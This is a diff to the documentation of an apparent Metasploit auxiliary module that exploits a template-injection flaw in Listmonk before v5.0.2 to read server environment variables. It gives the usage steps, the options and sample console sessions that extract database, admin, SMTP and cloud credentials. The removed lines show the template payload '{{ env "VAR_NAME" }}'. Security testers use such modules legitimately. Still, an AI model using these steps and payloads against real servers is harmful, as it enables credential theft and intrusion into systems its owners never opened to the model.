@@ -29,7 +29,7 @@ docker run -p 9000:9000 listmonk/listmonk:v5.0.1
 
 #### Vulnerable Versions
 
-- Listmonk < v5.0.2
+- Listmonk >= v4.0.0 and < v5.0.2
 
 #### Patched Versions
 
@@ -42,7 +42,7 @@ docker run -p 9000:9000 listmonk/listmonk:v5.0.1
 3. Do: `set RHOSTS [target]`
 4. Do: `set USERNAME [username]`
 5. Do: `set PASSWORD [password]`
-6. Do: `set ENVVAR [environment_variable]`
+6. Optional: `set ENVVAR [comma-separated environment variables]`
 7. Do: `run`
 8. You should see extracted environment variable values
 
@@ -59,11 +59,19 @@ The Listmonk password for authentication.
 
 ### ENVVAR
 
-The specific environment variable name to extract. Common targets include:
+A comma-separated list of environment variable names to extract. If not specified,
+the module will automatically attempt to extract a default list of common sensitive
+environment variables.
 
-- `LISTMONK_db__host`, `LISTMONK_db__port` - Database connection details
-- `LISTMONK_db__user`, `LISTMONK_db__password` - Database credentials
+**Default variables extracted (when ENVVAR is not set):**
+- `LISTMONK_db__host` - Database host
+- `LISTMONK_db__port` - Database port
+- `LISTMONK_db__user` - Database username
+- `LISTMONK_db__password` - Database password
 - `LISTMONK_db__database` - Database name
+- `LISTMONK_app__address` - Application address
+
+**Examples of custom variables to target:**
 - `LISTMONK_app__admin_username`, `LISTMONK_app__admin_password` - Admin credentials
 - `SMTP_HOST`, `SMTP_PORT`, `SMTP_USER`, `SMTP_PASSWORD` - Email server credentials
 - `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` - Cloud provider credentials
@@ -71,14 +79,11 @@ The specific environment variable name to extract. Common targets include:
 - `SECRET_KEY`, `API_KEY` - Application secrets
 - `PATH`, `HOME`, `USER` - System environment variables
 
-This option is mutually exclusive with PAYLOAD_FILE. Either ENVVAR or PAYLOAD_FILE must be specified.
+### CAMPAIGN_NAME
 
-### PAYLOAD_FILE
-
-Path to a file containing custom template payload to extract multiple environment variables.
-Each line should contain a template expression like `{{ env "VAR_NAME" }}`.
-
-This option is mutually exclusive with ENVVAR. Either ENVVAR or PAYLOAD_FILE must be specified.
+Optional campaign name to use for the temporary campaign created during extraction.
+If not specified, a random name will be generated to avoid collisions when running
+the module multiple times. The campaign is automatically deleted after extraction.
 
 ## Scenarios
 
@@ -96,7 +101,10 @@ msf6 auxiliary(gather/listmonk_env_disclosure) > check
 [*] 192.168.1.100:9000 - The target appears to be vulnerable. Listmonk version 5.0.1 is vulnerable
 ```
 
-### Extract Single Environment Variable
+### Extract Default Environment Variables
+
+Running the module without specifying ENVVAR will automatically extract the default
+list of common Listmonk environment variables:
 
 ```
 msf6 > use auxiliary/gather/listmonk_env_disclosure
@@ -106,51 +114,63 @@ msf6 auxiliary(gather/listmonk_env_disclosure) > set USERNAME admin
 USERNAME => admin
 msf6 auxiliary(gather/listmonk_env_disclosure) > set PASSWORD adminadmin
 PASSWORD => adminadmin
-msf6 auxiliary(gather/listmonk_env_disclosure) > set ENVVAR LISTMONK_db__password
-ENVVAR => LISTMONK_db__password
 msf6 auxiliary(gather/listmonk_env_disclosure) > run
 
 [*] Running module against 127.0.0.1
 [*] Targeting http://127.0.0.1:9000/
 [+] Login successful
+[*] Using default environment variable list (6 variables)
 [*] Executing template to extract environment variables...
 [+] Environment variable(s) extracted:
 
-my_secure_db_password123
+LISTMONK_db__host: localhost
+LISTMONK_db__port: 5432
+LISTMONK_db__user: listmonk_user
+LISTMONK_db__password: my_secure_db_password123
+LISTMONK_db__database: listmonk
+LISTMONK_app__address: 0.0.0.0:9000
 
 [*] Auxiliary module execution completed
 ```
 
-### Extract Multiple Environment Variables Using Payload File
+### Extract Specific Environment Variables
 
-Create a payload file (payload.txt):
-
-```
-{{ env "LISTMONK_db__user" }}
-{{ env "LISTMONK_db__password" }}
-{{ env "LISTMONK_app__admin_password" }}
-{{ env "SMTP_PASSWORD" }}
-```
-
-Run the module:
+You can target specific environment variables by providing a comma-separated list:
 
 ```
-msf6 auxiliary(gather/listmonk_env_disclosure) > set PAYLOAD_FILE /tmp/payload.txt
-PAYLOAD_FILE => /tmp/payload.txt
-msf6 auxiliary(gather/listmonk_env_disclosure) > unset ENVVAR
-Unsetting ENVVAR...
+msf6 auxiliary(gather/listmonk_env_disclosure) > set ENVVAR LISTMONK_db__password,LISTMONK_app__admin_password,SMTP_PASSWORD
+ENVVAR => LISTMONK_db__password,LISTMONK_app__admin_password,SMTP_PASSWORD
 msf6 auxiliary(gather/listmonk_env_disclosure) > run
 
 [*] Running module against 127.0.0.1
 [*] Targeting http://127.0.0.1:9000/
 [+] Login successful
+[*] Targeting specific environment variables: LISTMONK_db__password, LISTMONK_app__admin_password, SMTP_PASSWORD
 [*] Executing template to extract environment variables...
 [+] Environment variable(s) extracted:
 
-listmonk_user
-my_secure_db_password123
-admin_secret_password
-smtp_pass_2024
+LISTMONK_db__password: my_secure_db_password123
+LISTMONK_app__admin_password: admin_secret_password
+SMTP_PASSWORD: smtp_pass_2024
+
+[*] Auxiliary module execution completed
+```
+
+### Extract Single Environment Variable
+
+```
+msf6 auxiliary(gather/listmonk_env_disclosure) > set ENVVAR PATH
+ENVVAR => PATH
+msf6 auxiliary(gather/listmonk_env_disclosure) > run
+
+[*] Running module against 127.0.0.1
+[*] Targeting http://127.0.0.1:9000/
+[+] Login successful
+[*] Targeting specific environment variables: PATH
+[*] Executing template to extract environment variables...
+[+] Environment variable(s) extracted:
+
+PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
 [*] Auxiliary module execution completed
 ```
